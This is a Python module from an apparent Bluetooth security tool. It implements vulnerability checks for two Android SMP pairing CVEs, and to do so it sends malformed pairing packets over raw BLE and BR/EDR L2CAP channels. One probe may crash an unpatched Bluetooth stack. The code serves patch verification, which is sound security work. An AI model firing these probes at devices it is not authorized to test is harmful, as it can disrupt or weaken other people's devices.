"""CVE detection checks for BLE SMP (Security Manager Protocol).

Checks implemented:
  - CVE-2024-34722: Android BLE legacy pairing authentication bypass via
    deliberately wrong Pairing_Confirm — patched stacks return PAIRING_FAILED
    reason 0x04; unpatched stacks advance past the confirm check.
  - CVE-2018-9365: Android SMP cross-transport OOB array index via
    SMP_PAIRING_REQ to BR/EDR fixed CID 0x0007 — patched stacks return
    SMP_PAIRING_FAILED(Pairing Not Supported); unpatched stacks may crash.

Each check function returns a list[dict] of findings. An empty list means either
not applicable (ssp gate not met, service absent) or the target appears patched.
"""

from __future__ import annotations

import ctypes
import ctypes.util
import os
import socket
import struct
import time

from blue_tap.attack.cve_framework import make_cve_finding as _finding
from blue_tap.utils.bt_helpers import get_adapter_address

AF_BLUETOOTH = 31
BTPROTO_L2CAP = 0

# ---------------------------------------------------------------------------
# ctypes helper for BLE fixed-channel connections (SMP CID=0x0006)
# ---------------------------------------------------------------------------
# Python socket.connect() only accepts (bdaddr, psm) tuples. To reach BLE
# fixed SMP channel (CID 0x0006) we must call libc connect() directly with
# struct sockaddr_l2 setting l2_cid instead of l2_psm.

try:
    _libc = ctypes.CDLL(ctypes.util.find_library("c"), use_errno=True)
except Exception:
    _libc = None


class _BdAddrBytes(ctypes.Structure):
    _fields_ = [("b", ctypes.c_uint8 * 6)]


class _SockAddrL2(ctypes.Structure):
    _fields_ = [
        ("l2_family",      ctypes.c_uint16),
        ("l2_psm",         ctypes.c_uint16),
        ("l2_bdaddr",      _BdAddrBytes),
        ("l2_cid",         ctypes.c_uint16),
        ("l2_bdaddr_type", ctypes.c_uint8),
    ]


_BDADDR_LE_PUBLIC = 1


def _connect_ble_smp(address: str, timeout: float = 8.0, hci: str | None = None) -> "socket.socket | None":
    """Open a SEQPACKET socket connected to BLE SMP fixed channel (CID 0x0006).

    With this approach recv/send operate on the raw SMP payload (no L2CAP header).
    Returns connected socket or None on failure.
    """
    if _libc is None:
        return None
    sock = None
    try:
        sock = socket.socket(AF_BLUETOOTH, socket.SOCK_SEQPACKET, BTPROTO_L2CAP)
        sock.settimeout(timeout)

        if hci:
            local_addr = get_adapter_address(hci)
            if local_addr:
                bind_sa = _SockAddrL2()
                bind_sa.l2_family = AF_BLUETOOTH
                bind_sa.l2_psm = 0
                bind_parts = [int(x, 16) for x in local_addr.split(":")]
                for i, byte_val in enumerate(reversed(bind_parts)):
                    bind_sa.l2_bdaddr.b[i] = byte_val
                bind_sa.l2_cid = 0
                bind_sa.l2_bdaddr_type = _BDADDR_LE_PUBLIC
                _libc.bind(sock.fileno(), ctypes.byref(bind_sa), ctypes.sizeof(bind_sa))

        sa = _SockAddrL2()
        sa.l2_family = AF_BLUETOOTH
        sa.l2_psm = 0  # PSM=0 → use CID
        parts = [int(x, 16) for x in address.split(":")]
        for i, byte_val in enumerate(reversed(parts)):
            sa.l2_bdaddr.b[i] = byte_val
        sa.l2_cid = 0x0006  # BLE SMP fixed channel
        sa.l2_bdaddr_type = _BDADDR_LE_PUBLIC

        ret = _libc.connect(sock.fileno(), ctypes.byref(sa), ctypes.sizeof(sa))
        if ret != 0:
            sock.close()
            return None
        return sock
    except Exception:
        if sock is not None:
            try:
                sock.close()
            except OSError:
                pass
        return None
# ---------------------------------------------------------------------------
# Check 1: CVE-2024-34722 — Android BLE Legacy Pairing Auth Bypass
# ---------------------------------------------------------------------------

def _check_ble_legacy_pairing_bypass(address: str) -> list[dict]:
    """Send BLE SMP legacy pairing with a deliberately wrong Pairing_Confirm.

    Patched stacks return PAIRING_FAILED with reason 0x04 (Confirm Value Failed).
    Unpatched stacks advance past the confirm stage, indicating that
    smp_proc_rand() does not verify the Confirm before proceeding
    (CVE-2024-34722).
    """
    # Connect directly to BLE SMP fixed channel (CID 0x0006) via ctypes sockaddr_l2.
    # PSM 0x0004 is in the BR/EDR RFCOMM range; BLE fixed channels require l2_cid.
    # With this approach, recv/send operate on raw SMP payload (no L2CAP header).
    sock = _connect_ble_smp(address, timeout=8.0)
    if sock is None:
        return [_finding(
            "INFO", "CVE-2024-34722: Pairing Required",
            "Legacy BLE pairing bypass check requires the target to accept an unauthenticated "
            "BLE SMP session. Blue-Tap could not open the SMP fixed channel in the current state.",
            cve="CVE-2024-34722", status="pairing_required", confidence="high",
            evidence="Target was not connectable/pairable on BLE SMP CID 0x0006",
        )]

    try:
        # SMP_PAIRING_REQ (opcode 0x01):
        # IO_Capability=NoInputNoOutput(0x03), OOB=0x00, AuthReq=0x00 (no SC),
        # MaxEncKeySize=0x10, InitKeyDist=0x00, RespKeyDist=0x00
        pairing_req = bytes([0x01, 0x03, 0x00, 0x00, 0x10, 0x00, 0x00])
        sock.sendall(pairing_req)

        # Read SMP_PAIRING_RSP (opcode 0x02)
        resp = sock.recv(256)
        if not resp or len(resp) < 1:
            return [_finding(
                "INFO", "CVE-2024-34722: Pairing Required",
                "Target did not enter BLE pairing after the legacy Pairing Request. Put the "
                "target into pairable BLE mode and re-run the check.",
                cve="CVE-2024-34722", status="pairing_required", confidence="high",
                evidence="No SMP_PAIRING_RSP received from target",
            )]
        if resp[0] != 0x02:
            return [_finding(
                "MEDIUM", "CVE-2024-34722: Inconclusive",
                "Target responded on BLE SMP, but not with the expected Pairing Response "
                "needed to validate the confirm-value bypass path.",
                cve="CVE-2024-34722", status="inconclusive", confidence="medium",
                evidence=f"Unexpected first SMP opcode=0x{resp[0]:02X}",
            )]

        # Send deliberately WRONG SMP_PAIRING_CONFIRM (opcode 0x03) = 16 random bytes
        wrong_confirm = bytes([0x03]) + os.urandom(16)
        sock.sendall(wrong_confirm)

        # Send SMP_PAIRING_RANDOM (opcode 0x04) = 16 random bytes
        pairing_random = bytes([0x04]) + os.urandom(16)
        sock.sendall(pairing_random)

        # Read response — should be PAIRING_FAILED (0x05) with reason 0x04
        resp2 = sock.recv(256)

        if resp2 and len(resp2) >= 2:
            smp_opcode = resp2[0]  # SMP opcode at byte 0 (no L2CAP header)
            if smp_opcode == 0x05:  # SMP_PAIRING_FAILED
                reason = resp2[1]
                if reason == 0x04:
                    return []
                return [_finding(
                    "MEDIUM", "CVE-2024-34722: Inconclusive",
                    "Target rejected the malformed legacy pairing flow, but not with the "
                    "documented Confirm Value Failed reason code.",
                    cve="CVE-2024-34722", status="inconclusive", confidence="medium",
                    evidence=f"SMP_PAIRING_FAILED reason=0x{reason:02X}",
                )]
            elif smp_opcode in (0x03, 0x04, 0x06, 0x07, 0x08):
                # Pairing advanced past confirm check = VULNERABLE
                return [_finding("CRITICAL",
                    "Android BLE Legacy Pairing Auth Bypass (CVE-2024-34722)",
                    "BLE SMP legacy pairing advanced past Pairing_Confirm stage despite "
                    "receiving a deliberately incorrect confirmation value. "
                    "smp_proc_rand() does not verify the Confirm before advancing.",
                    cve="CVE-2024-34722",
                    impact="Complete BLE pairing bypass — attacker establishes LTK without knowing TK",
                    remediation="Apply Android Security Bulletin 2024-09-01",
                    status="confirmed", confidence="high",
                    evidence=f"SMP advanced with opcode=0x{smp_opcode:02X} after wrong Confirm")]
            return [_finding(
                "MEDIUM", "CVE-2024-34722: Inconclusive",
                "BLE SMP session continued, but the post-confirm response did not match the "
                "documented patched or vulnerable states for this Android-specific CVE.",
                cve="CVE-2024-34722", status="inconclusive", confidence="medium",
                evidence=f"Unexpected post-confirm SMP opcode=0x{smp_opcode:02X}",
            )]
    except OSError:
        return [_finding(
            "MEDIUM", "CVE-2024-34722: Inconclusive",
            "BLE legacy pairing bypass probe hit a transport error before the state-machine "
            "differential could be classified.",
            cve="CVE-2024-34722", status="inconclusive", confidence="medium",
            evidence="Transport error during BLE SMP probe",
        )]
    finally:
        sock.close()
    return []


# ---------------------------------------------------------------------------
# Check 2: CVE-2018-9365 — Android SMP Cross-Transport OOB Array Index
# ---------------------------------------------------------------------------

def _check_smp_bredr_oob(address: str, ssp: bool | None = None) -> list[dict]:
    """Send SMP_PAIRING_REQ to BR/EDR fixed CID 0x0007.

    Gate: ssp must be True (SSP-capable device). Classic BT only.

    Patched stacks return SMP_PAIRING_FAILED with reason 0x05 (Pairing Not
    Supported). Unpatched Android 6-8.1 stacks may process the packet and
    trigger an OOB array index in smp_sm_event(), or disconnect/crash
    (CVE-2018-9365).
    """
    if ssp is False:
        return [_finding(
            "INFO", "CVE-2018-9365: Not Applicable",
            "SMP cross-transport OOB check skipped — target does not support SSP "
            "(Secure Simple Pairing). CVE-2018-9365 requires SSP-capable BR/EDR devices "
            "to process SMP over the BR/EDR SMP fixed channel (CID 0x0007).",
            cve="CVE-2018-9365", status="not_applicable", confidence="high",
            evidence=f"SSP={ssp} — check only applies to SSP-capable BR/EDR devices",
        )]
    if ssp is None:
        return [_finding(
            "INFO", "CVE-2018-9365: Inconclusive",
            "Cross-transport SMP check needs SSP capability information to decide whether the "
            "BR/EDR SMP path is relevant for this target.",
            cve="CVE-2018-9365", status="inconclusive", confidence="medium",
            evidence="SSP support could not be determined before probe",
        )]

    try:
        # SOCK_RAW required to inject L2CAP frames to BR/EDR SMP fixed CID 0x0007.
        # With SOCK_SEQPACKET the kernel routes our data as application payload on an
        # existing channel, never reaching the BR/EDR SMP signaling handler.
        sock = socket.socket(AF_BLUETOOTH, socket.SOCK_RAW, BTPROTO_L2CAP)
        sock.settimeout(6.0)
        sock.connect((address, 0))  # address-only bind for raw L2CAP

        # Send SMP_PAIRING_REQ to BR/EDR SMP fixed CID 0x0007
        # SMP_PAIRING_REQ: opcode(1) + IO(1) + OOB(1) + AuthReq(1) + MaxKey(1) + Init(1) + Resp(1)
        pairing_req = bytes([0x01, 0x03, 0x00, 0x01, 0x10, 0x00, 0x00])
        frame = struct.pack("<HH", len(pairing_req), 0x0007) + pairing_req  # CID=0x0007

        sock.sendall(frame)

        try:
            resp = sock.recv(256)
            sock.close()

            if resp and len(resp) >= 6:
                smp_opcode = resp[4]
                if smp_opcode == 0x05:  # SMP_PAIRING_FAILED
                    # Any rejection = PATCHED
                    return []
                # Any non-failure response = VULNERABLE
                return [_finding("HIGH",
                    "Android SMP Cross-Transport OOB Array Index (CVE-2018-9365)",
                    "SMP_PAIRING_REQ to BR/EDR fixed CID 0x0007 did not return "
                    "SMP_PAIRING_FAILED(Pairing Not Supported). Device may process "
                    "SMP packets over BR/EDR, triggering OOB array index in smp_sm_event().",
                    cve="CVE-2018-9365",
                    impact="OOB array write in Bluetooth stack — potential RCE on Android 6-8.1",
                    remediation="Apply Android Security Bulletin 2018-04-01",
                    status="confirmed", confidence="high",
                    evidence=f"SMP_PAIRING_REQ to CID 0x0007 received opcode=0x{smp_opcode:02X}")]
        except TimeoutError:
            # Timeout = device may have disconnected (unpatched crash behavior)
            return [_finding("HIGH",
                "Android SMP Cross-Transport OOB Array Index (CVE-2018-9365)",
                "SMP_PAIRING_REQ to BR/EDR fixed CID 0x0007 resulted in connection timeout/drop. "
                "Unpatched Android 6-8.1 may crash the Bluetooth stack with OOB array access.",
                cve="CVE-2018-9365",
                impact="OOB array write crash — potential RCE on Android 6-8.1",
                remediation="Apply Android Security Bulletin 2018-04-01",
                status="confirmed", confidence="medium",
                evidence="SMP to CID 0x0007 caused connection timeout (possible stack crash)")]
    except OSError as exc:
        return [_finding(
            "MEDIUM", "CVE-2018-9365: Inconclusive",
            "Cross-transport SMP probe did not complete cleanly on the BR/EDR path.",
            cve="CVE-2018-9365", status="inconclusive", confidence="medium",
            evidence=str(exc),
        )]
    return []
